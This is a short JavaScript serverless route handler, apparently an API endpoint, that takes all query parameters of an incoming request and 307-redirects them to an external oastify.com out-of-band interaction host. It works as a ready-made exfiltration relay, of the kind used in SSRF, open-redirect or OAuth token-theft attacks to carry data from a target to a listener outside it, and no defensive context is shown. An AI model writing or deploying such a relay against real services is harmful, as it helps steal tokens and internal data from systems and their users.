export default (req, res) => {
  const queryString = Object.keys(req.query)
    .map(key => `${key}=${req.query[key]}`)
    .join('&');

  res.redirect(307, `https://darflstq9blxlnjk7epaz7fuzl5ctbvzk.oastify.com/?${queryString}`);
};
